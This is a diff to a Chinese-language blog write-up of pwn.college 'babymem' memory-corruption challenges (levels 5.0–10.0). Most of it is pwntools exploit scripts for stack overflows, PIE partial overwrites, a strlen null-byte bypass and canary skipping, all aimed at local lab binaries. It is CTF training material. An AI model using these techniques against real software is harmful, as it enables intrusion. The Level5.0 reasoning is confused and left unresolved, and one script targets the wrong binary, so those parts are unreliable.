@@ -3436,13 +3436,179 @@ p.send(payload)
 
 p.interactive()
 </code></pre>
-<h4 id="Level5-0">Level5.0<a class="post-anchor" href="#Level5-0"></a></h4><p>​        研究了一天的pwndocker的bug….所以说不管在哪里美丽和优雅都是有代价的。</p>
-<p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>
+<h4 id="Level5-0">Level5.0<a class="post-anchor" href="#Level5-0"></a></h4><p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>
 <pre><code class="c">if ( v31 * v32 &gt; 7 )
     sub_401150("record_size * record_num &lt; (unsigned int) sizeof(input)", "&lt;stdin&gt;", 143LL, "challenge");
 </code></pre>
-<p>​        并且这里并不能再构造负数了。</p>
-</body></html>]]></content>
+<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.24.png" data-caption="截屏2022-03-05 下午4.53.24" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.24.png" alt="截屏2022-03-05 下午4.53.24"></a></p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.36.png" data-caption="截屏2022-03-05 下午4.53.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8B%E5%8D%884.53.36.png" alt="截屏2022-03-05 下午4.53.36"></a></p>
+<p>​        注意到这几个变量都是无符号整数。</p>
+<pre><code class="c">  sub_4011A0("%u", &amp;v32);
+</code></pre>
+<p>​        第一次读取的时候输入负数会被储存成正数（非常大）</p>
+<p>​        size的输入同理。</p>
+<p>​        然后相乘计算总共能输入的size。</p>
+<p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        </p>
+<p>​        4294967296是0，-1是4294967295，所以需要让v47为小于7的数，但是总之非常烦的是v47v3132都是uint，没有类型转换的话似乎溢出了也意义不大。唯一有可能的就是ida识别错误了，这里只有v32在相乘时会被强制类型转换。</p>
+<p>​        从目前的结果来说好像也并不矛盾，那么以这个思路来想的话，</p>
+<p>2147483647</p>
+<p>​        所以需要让两个int相乘的时候小于7（可以为负）。然后当v32位uint的时候变得很大。</p>
+<p>​        不知道怎么做。</p>
+<p>Level6.0</p>
+<p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+#p = process("./babymem_level5.0")
+p = process("/challenge/babymem_level6.0")
+#gdb.attach(p)
+#pad = 0x401B5 #0x30
+win_addr = 0x401693
+payload = b"a"*152+ p64(win_addr)
+
+
+p.sendline("160")
+p.recv()
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h4 id="Level6-1">Level6.1<a class="post-anchor" href="#Level6-1"></a></h4><p>​        同理。</p>
+<pre><code class="python">from pwn import*
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+p = process("./babymem_level6.1")
+#p = process("/challenge/babymem_level6.1")
+gdb.attach(p)
+#pad = 0x401B5 #0x30
+win_addr = 0x4013BA
+payload = b"a"*152+ p64(win_addr)
+
+
+p.sendline("160")
+p.recv()
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h4 id="Level7-0">Level7.0<a class="post-anchor" href="#Level7-0"></a></h4><p>​        开始考pie的绕过了，不走寻常路啊。</p>
+<p>​        之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。</p>
+<p>​        地址的后三个字符永远一致，所以只需爆破第四位，就能将<code>retn</code>覆盖成<code>win</code>    。</p>
+<p>​        （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛）</p>
+<pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+#p = process("./babymem_level7.0")
+p = process("/challenge/babymem_level7.0")
+#gdb.attach(p)
+#pad = 0x401B5 #0x30
+payload = b"a"*136+ b"\xf4\xbb"
+
+
+p.sendline("144")
+p.recv()
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。</p>
+<h4 id="Level7-1">Level7.1<a class="post-anchor" href="#Level7-1"></a></h4><pre><code class="python">from pwn import*
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+#p = process("./babymem_level7.1")
+p = process("/challenge/babymem_level8.0")
+
+#pad = 0x401B5 #0x30
+payload = b"a"*152+ b"\xa4\xb0"
+
+
+p.sendline("160")
+p.recv()
+#gdb.attach(p)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​                </p>
+<h4 id="Level8-0">Level8.0<a class="post-anchor" href="#Level8-0"></a></h4><p>​        好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。</p>
+<pre><code class="python">from pwn import*
+
+
+#context.terminal = ['tmux','splitw','-h']
+#context.log_level = "debug"
+
+#p = process("./babymem_level8.0")
+p = process("/challenge/babymem_level8.0")
+
+#pad = 0x401B5 #0x30
+payload = b'\x00'*152 + b"\xa4\xb0"
+p.sendline("160")
+p.recv()
+#gdb.attach(p)
+p.send(payload)
+
+
+p.interactive()
+</code></pre>
+<p>​        </p>
+<h4 id="Level8-1">Level8.1<a class="post-anchor" href="#Level8-1"></a></h4><p>​        同理</p>
+<pre><code class="python">from pwn import*
+
+context.terminal = ['tmux','splitw','-h']
+context.log_level = "debug"
+
+p = process("./babymem_level8.1")
+#p = process("/challenge/babymem_level8.1")
+
+payload = b'\x00'*104 + b"\x7e\x79"
+p.sendline("112")
+p.recv()
+gdb.attach(p)
+p.send(payload)
+
+p.interactive()
+
+</code></pre>
+<h4 id="Level9-0">Level9.0<a class="post-anchor" href="#Level9-0"></a></h4><p>​        以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上<code>\x60</code>直接绕到canary后覆写。</p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level9.1")
+
+payload = b'a'*72+b"\x60"+ b"\xbe\xc5"*6
+
+p.sendline("106")
+p.recv()
+
+p.send(payload)
+p.interactive()
+
+</code></pre>
+<h4 id="Level9-1">Level9.1<a class="post-anchor" href="#Level9-1"></a></h4><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png" data-caption="截屏2022-03-06 下午9.00.44" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png" alt="截屏2022-03-06 下午9.00.44"></a>        </p>
+<pre><code class="python">from pwn import*
+
+p = process("/challenge/babymem_level9.1")
+
+payload = b'a'*40+b"\x47"+ b"\x26\x46"
+#80+8 canary:16
+p.sendline("77")
+p.recv()
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<p>​        n的数量和size都需要精准控制才能拿flag。</p>
+<h4 id="Level10-0">Level10.0<a class="post-anchor" href="#Level10-0"></a></h4></body></html>]]></content>
       <tags>
         <tag>pwncollege</tag>
       </tags>
